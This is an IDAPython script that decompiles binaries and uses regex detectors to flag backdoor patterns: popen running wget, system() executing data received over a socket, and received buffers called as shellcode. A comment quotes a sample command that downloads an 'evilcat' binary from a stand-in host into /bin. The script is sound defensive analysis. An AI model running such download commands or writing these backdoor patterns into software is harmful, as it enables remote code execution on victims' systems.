from idaapi import *
from idautils import *
import re
import idc
import time
import ida_hexrays
#read share folder 
def get_all_addr(file_name):
	addrs=[]
	myfile=open(file_name,'r')
	for line in myfile.readlines():
		addrs.append(int(line,16))
	return addrs


# ea:the call instruction addrs
def decompile_func(ea):
	if not init_hexrays_plugin():
		#print 'no here'
		return ''

	f = get_func(ea)
	if f is None:
		return ''

	cfunc = ida_hexrays.decompile(f)
	if cfunc is None:
	# Failed to decompile
		return ''

	lines = []
	sv = cfunc.get_pseudocode();
	for sline in sv:
		line = tag_remove(sline.line);
		lines.append(line)
	return lines

def test_popen(mylog,file_name):
	addrs=get_all_addr('D:\\source\\test1\\addrs\\'+file_name+'.popen')
	funcs=[]
	for addr in addrs:
		f = get_func_name(addr)
		if(f is not None and f  not in funcs):
			test_func_flag=0
			mylog.write('start popen analysis func: '+f)
			print 'start popen analysis func: '+f,
			funcs.append(f)
			c_lines=decompile_func(addr)
			
			if(c_lines==''):
				print 'decompile_func error'
			else:
				for line in c_lines:
					#popen("cd /bin;wget -O evilcat http://myip.com/evilcat", "r");
					regex=re.search('popen\(.*wget',line)
					if regex:
						mylog.write(',yes\n')
						print ',yes'
						test_func_flag=1
						break
			if(test_func_flag==0):
				mylog.write(',no\n')
				print ',no'
					
def test_system(mylog,file_name):
	addrs=get_all_addr('D:\\source\\test1\\addrs\\'+file_name+'.system')
	funcs=[]
	for addr in addrs:
		f = get_func_name(addr)
		if(f is not None and f  not in funcs):
			flag_out=0
			mylog.write('start system analysis func: '+f)
			print 'start system analysis func: '+f,
			funcs.append(f)
			c_lines=decompile_func(addr)
			#all_lines='\n'.join(c_lines)
			if(c_lines==''):
				print 'decompile_func error'
			else:
				for line in c_lines:
					if(flag_out):
						break
					#recv(v105, _1b756b3aa8862d7730209615be62831e, 0x100uLL, 0);
					#system(_1b756b3aa8862d7730209615be62831e);
					regex=re.search('system\((?P<src>(.*))\);',line)
					if regex:
						system_cmd=regex.group('src')
						for tmp in c_lines:
							regex_recv=re.search('recv\(.*'+system_cmd+'.*\);',tmp)
							if regex_recv:
								mylog.write(',yes\n')
								print ',yes'
								flag_out=1
								break
			if(flag_out==0):
				mylog.write(',no\n')
				print ',no'					
			
def test_recv_shellcode(mylog,file_name):
	addrs=get_all_addr('D:\\source\\test1\\addrs\\'+file_name+'.recv')
	funcs=[]
	for addr in addrs:
		f = get_func_name(addr)
		if(f is not None and f  not in funcs):
			flag_out=0
			mylog.write('start recv_shellcode analysis func: '+f)
			print 'start recv_shellcode analysis func: '+f,
			funcs.append(f)
			c_lines=decompile_func(addr)
			lines_num=len(c_lines)
			#all_lines='\n'.join(c_lines)
			if(c_lines==''):
				print 'decompile_func error'
			else:
				recv_lines=[]
				taint_values=[]
				#1. find recv value
				for i in range(lines_num):
					if(flag_out):
						break
					#if ( recv(v19, _5924fc070d840801bdbed7cbbbc52f3e, 0x7D0uLL, 0) < 0 )
					regex=re.search('recv\((.*), (?P<src>(.*)), (.*), .*\)',c_lines[i])
					if regex:
						recv_value=regex.group('src')
						recv_lines.append((i,recv_value))
						taint_values.append(recv_value)
						#print recv_value
				#2. find taint value from =
				for (tmp_i,tmp_recv_value) in recv_lines:
					for i in range(tmp_i,lines_num):
						#*v28 = _5924fc070d840801bdbed7cbbbc52f3e[0];
						#v30 = _5924fc070d840801bdbed7cbbbc52f3e;
						regex_recv=re.search('(?P<src>(.*)) = '+tmp_recv_value+'.*;',c_lines[i])
						if regex_recv:
							taint_value=regex_recv.group('src').strip(' ').strip('*')
							taint_values.append(taint_value)
				#2.1 find taint value from strcpy
				for (tmp_i,tmp_recv_value) in recv_lines:
					for i in range(tmp_i,lines_num):
						#*v28 = _5924fc070d840801bdbed7cbbbc52f3e[0];
						#v30 = _5924fc070d840801bdbed7cbbbc52f3e;
						regex_recv=re.search('(?P<src>(.*)) = '+tmp_recv_value+'.*;',c_lines[i])
						if regex_recv:
							taint_value=regex_recv.group('src').strip(' ').strip('*')
							taint_values.append(taint_value)
				#3. find call shellcode
				for taint_value1 in taint_values:
					if(flag_out==1):
						break
					#print taint_value1
					for (tmp_i,tmp_recv_value) in recv_lines:
						if(flag_out==1):
							break
						for i in range(tmp_i,lines_num):
							#((void (__fastcall *)(_DWORD *, char *, signed __int64, signed __int64))v28)(v34, v35, v31, v33);
							regex_recv1=re.search('call \*\).*'+taint_value1+'.*;',c_lines[i])
							if regex_recv1:
								mylog.write(',yes\n')
								print ',yes'
								flag_out=1
								break
			if(flag_out==0):
				mylog.write(',no\n')
				print ',no'
def main():
	
	print 'start analysis'	
	file_name=get_root_filename()
	mylog=open('D:\\source\\test1\\output\\'+file_name+'.output','w')
	print 'start popen analysis'
	
	test_popen(mylog,file_name)
	print 'start system analysis'
	test_system(mylog,file_name)
	print 'start recv_shellcode analysis'
	
	test_recv_shellcode(mylog,file_name)
	mylog.close()
	print 'ok'
	#idc.Exit(0)
autoWait()
load_plugin('hexrays')
main()
#print decompile_func(here())
#ida64.exe -S"D:\source\idapython\test.py" "D:\source\test1\install_dir\p_17\test_xcb_image_shm"